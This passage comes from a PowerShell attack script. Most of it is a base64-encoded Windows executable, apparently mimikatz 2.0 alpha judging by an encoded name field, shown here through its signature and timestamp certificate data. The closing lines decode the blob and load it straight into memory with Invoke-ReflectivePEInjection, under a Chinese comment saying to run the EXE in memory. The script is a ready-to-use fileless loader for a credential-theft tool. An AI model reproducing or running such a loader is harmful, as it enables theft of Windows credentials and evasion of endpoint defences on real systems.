wQCAQUAoIHMMBkGCSqGSIb3DQEJAzEMBgorBgEEAYI3AgEEMBwGCisGAQQBgjcCAQsxDjAMBgorBgEEAYI3AgEVMC8GCSqGSIb3DQEJBDEiBCDHrLTY6L3yk4EXBlbZDmRi9ZdCypynRvEk/ML3ubZ6zzBgBgorBgEEAYI3AgEMMVIwUKAmgCQAbQBpAG0AaQBrAGEAdAB6ACAAMgAuADAAIABhAGwAcABoAGGhJoAkaHR0cDovL2Jsb2cuZ2VudGlsa2l3aS5jb20vbWltaWthdHogMA0GCSqGSIb3DQEBAQUABIIBAIlzwsXca+h4wKzhX7zD4fZrM6iB3ImxnINVz1SDav1yMeD9/ZVbAiutauz9kh9iUD+iwMuzojokf6qIFm3fGoHclMxdnHEzQNG9ff4nGi2SmtfdwMYsaKe2OpHP5ZFus69QAwn0ixD04uck03R7AKJcz3ZpOeCQfuoP7SA3faP9iljhYAqOPNse1wpsa7bkVFDyMyvX+gvCKctHA2W3UAC7/hYbW+jw+ea6veZbs/3w5iOQ4dk1TwGxGnbimkpz9yxrxEfj4F+BAPYZtb3MkB/bes5y/okagkrIGLkL3eaC483S1BsQmLW3oMHjVB902bh9Dp+R6b3TwXH9y90TBguhggxoMIIMZAYKKwYBBAGCNwMDATGCDFQwggxQBgkqhkiG9w0BBwKgggxBMIIMPQIBAzELMAkGBSsOAwIaBQAwgd0GCyqGSIb3DQEJEAEEoIHNBIHKMIHHAgEBBgkrBgEEAaAyAgIwMTANBglghkgBZQMEAgEFAAQgkhDAHqQQbvkcHkigXPvXGvx39BBMI0pa4r22RKQNKSwCFF4LrWQ+Nk50tqfUm+JkBMZZG53bGA8yMDE0MDQxNDE0MzQ1NlqgXaRbMFkxCzAJBgNVBAYTAlNHMR8wHQYDVQQKExZHTU8gR2xvYmFsU2lnbiBQdGUgTHRkMSkwJwYDVQQDEyBHbG9iYWxTaWduIFRTQSBmb3IgU3RhbmRhcmQgLSBHMaCCCLQwggSYMIIDgKADAgECAhIRISIxkMjyEz9vk8cjFPCS5lwwDQYJKoZIhvcNAQEFBQAwUjELMAkGA1UEBhMCQkUxGTAXBgNVBAoTEEdsb2JhbFNpZ24gbnYtc2ExKDAmBgNVBAMTH0dsb2JhbFNpZ24gVGltZXN0YW1waW5nIENBIC0gRzIwHhcNMTMwODIzMDAwMDAwWhcNMjQwOTIzMDAwMDAwWjBZMQswCQYDVQQGEwJTRzEfMB0GA1UEChMWR01PIEdsb2JhbFNpZ24gUHRlIEx0ZDEpMCcGA1UEAxMgR2xvYmFsU2lnbiBUU0EgZm9yIFN0YW5kYXJkIC0gRzEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCktsJMRQ7isGwlnoJ3dA9NxHmh5003U3g0b4bKu6QytC3BKqpj+/Vr/7gpWYkRP9t6OjjCjimBI9QzDSCl5BQxZIz+qGzlEj/YnJiWnoW93u+GwBq+y9ONtVLnJdotAnFyJPes3mPEaznmNPRCyR7rLPUUTJl4fdvP9IqjiFqh5Dh5uj+JPhHZjlLuzieZ4OxYqB6yFPhoum8tANSSCUAa2QLmnCVa0LjTct8ObKn99Z3doIMbeoGYQFDxYLYwayWV27rcgd76j4zDWLIPLvWwmDcBzgod9/G8q5tArXSPcJQlnwvKtP/ONZcAe9lagWnC2smhdboezsQXNRuxy8tNAgMBAAGjggFfMIIBWzAOBgNVHQ8BAf8EBAMCB4AwTAYDVR0gBEUwQzBBBgkrBgEEAaAyAR4wNDAyBggrBgEFBQcCARYmaHR0cHM6Ly93d3cuZ2xvYmFsc2lnbi5jb20vcmVwb3NpdG9yeS8wCQYDVR0TBAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDBCBgNVHR8EOzA5MDegNaAzhjFodHRwOi8vY3JsLmdsb2JhbHNpZ24uY29tL2dzL2dzdGltZXN0YW1waW5nZzIuY3JsMFQGCCsGAQUFBwEBBEgwRjBEBggrBgEFBQcwAoY4aHR0cDovL3NlY3VyZS5nbG9iYWxzaWduLmNvbS9jYWNlcnQvZ3N0aW1lc3RhbXBpbmdnMi5jcnQwHQYDVR0OBBYEFE81QbX5SpLOSClQSwMss3f6KkC0MB8GA1UdIwQYMBaAFEbYPv/c477/g+b0hZuw3WrWFKnBMA0GCSqGSIb3DQEBBQUAA4IBAQCQfDL4lRcHLMrZzMoxDaMYscbXiRQmcH3HMJy9k7ujSOkg7oUKZLYker/HTV2nYI6q7aQmfp7LqyMnFlEtmPwjWmyjjepymMslXes8iskQ/y0+1+ufmB2CmaNjolbaXVDT1zb1MZgAN0N34hCtBPE8l1WQy7ZArvUgB0pO4uhXrW5Mc1qMb9p/5VJXUuuZQk3X63VMdfMSPJTKomp2O3L/GFgwr4uKcxvcO+yoXB4KxCm9f0c5xqKzJoCctobaxb/dZNRwfvFIMzTe+5kf1ygk77JeHZ3qDgLvD7UT0byaOM2DVQSU0CJnLS7CMhHOpX99qsC+OXwQLMHqgEKcmDeMMIIEFDCCAvygAwIBAgILBAAAAAABL07hUtcwDQYJKoZIhvcNAQEFBQAwVzELMAkGA1UEBhMCQkUxGTAXBgNVBAoTEEdsb2JhbFNpZ24gbnYtc2ExEDAOBgNVBAsTB1Jvb3QgQ0ExGzAZBgNVBAMTEkdsb2JhbFNpZ24gUm9vdCBDQTAeFw0xMTA0MTMxMDAwMDBaFw0yODAxMjgxMjAwMDBaMFIxCzAJBgNVBAYTAkJFMRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMSgwJgYDVQQDEx9HbG9iYWxTaWduIFRpbWVzdGFtcGluZyBDQSAtIEcyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlO9l+LVXn6BTDTQG6wkft0cYasvwW+T/J6U00feJGr+esc0SQW5m1IGghYtkWkYvmaCNd7HivFzdItdqZ9C76Mp03otPDbBS5ZBb60cO8eefnAuQZT4XljBFcm05oRc2yrmgjBtPCBn2gTGtYRakYua0QJ7D/PuV9vu1LpWBmODvxevYAll4d/eq41JrUJEpxfz3zZNl0mBhIvIG+zLdFlH6Dv2KMPAXCae78wSuq5DnbN96qfTvxGInX2+ZbTh0qhGL2t/HFEzphbLswn1KJo/nVrqm4M+SU4B09APsaLJgvIQgAIMboe60dAXBKY5i0Eex+vBTzBj5Ljv5cH60JQIDAQABo4HlMIHiMA4GA1UdDwEB/wQEAwIBBjASBgNVHRMBAf8ECDAGAQH/AgEAMB0GA1UdDgQWBBRG2D7/3OO+/4Pm9IWbsN1q1hSpwTBHBgNVHSAEQDA+MDwGBFUdIAAwNDAyBggrBgEFBQcCARYmaHR0cHM6Ly93d3cuZ2xvYmFsc2lnbi5jb20vcmVwb3NpdG9yeS8wMwYDVR0fBCwwKjAooCagJIYiaHR0cDovL2NybC5nbG9iYWxzaWduLm5ldC9yb290LmNybDAfBgNVHSMEGDAWgBRge2YaRQ2XyolQL30EzTSo//z9SzANBgkqhkiG9w0BAQUFAAOCAQEATl5WkB5GtNlJMfO7FzkoG8IW3f1B3AkFBJtvsqKa1pkuQJkAVbXqP6UgdtOGNNQXzFU6x4Lu76i6vNgGnxVQ380We1I6AtcZGv2v8Hhc4EvFGN86JB7arLipWAQCBzDbsBJe/jG+8ARI9PBw+DpeVoPPPfsNvPTF7ZedudTbpSeE4zibi6c1hkQgpDttpGoLoYP9KOva7yj2zIhd+wo7AKvgIeviLzVsD440RZfroveZMzV+y5qKu0VN5z+fwtmK+mWybsd+Zf/okuEsMaL3sCc2SI8mbzvuTXYfecPlf5Y1vC0OzAGwjn//UYCAp5LUs0RGZIyHTxZjBzFLY7Df8zGCApEwggKNAgEBMGgwUjELMAkGA1UEBhMCQkUxGTAXBgNVBAoTEEdsb2JhbFNpZ24gbnYtc2ExKDAmBgNVBAMTH0dsb2JhbFNpZ24gVGltZXN0YW1waW5nIENBIC0gRzICEhEhIjGQyPITP2+TxyMU8JLmXDAJBgUrDgMCGgUAoIH/MBoGCSqGSIb3DQEJAzENBgsqhkiG9w0BCRABBDAcBgkqhkiG9w0BCQUxDxcNMTQwNDE0MTQzNDU2WjAjBgkqhkiG9w0BCQQxFgQU6EPsieMzgKi4mBJc/xrLf9MFjgkwgZ0GCyqGSIb3DQEJEAIMMYGNMIGKMIGHMIGEBBRJY8cUIZM10E568DntQ5flqbxVPzBsMFakVDBSMQswCQYDVQQGEwJCRTEZMBcGA1UEChMQR2xvYmFsU2lnbiBudi1zYTEoMCYGA1UEAxMfR2xvYmFsU2lnbiBUaW1lc3RhbXBpbmcgQ0EgLSBHMgISESEiMZDI8hM/b5PHIxTwkuZcMA0GCSqGSIb3DQEBAQUABIIBAIiR4a/hEg76ZRRsYQahhXuD0HMuN5EUBXcPwXW4+zUxBSo6+Li0E19tY1hlAlVyaHrSRprKSKxw9/YvDlCOGJ+rYJvOJX9Ktm9iRYrB1gFMFQyjXMh4EE/1wuD7PYZMeaLCD61KrnGynuA9C4BJp7miaHb17pzCSsEg13iNgbYgbKuPXSltQUJCOz+nlXwmROvIBMCRIEAH2thyaHWbvplRBxxROXDZkdbSX15379kHZjpiCT6a3Ozo9SB6HUSmD5lAkusWy2GFpeMmGTqARuOQclAYK4HraVywxcMNdfF8T+QxwiKT6MTsioRnluaN3VfZP1dn4U7IhYjPKQFnjnIA'
$PEBytes = [System.Convert]::FromBase64String($InputString)
# 在内存中运行 EXE

Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"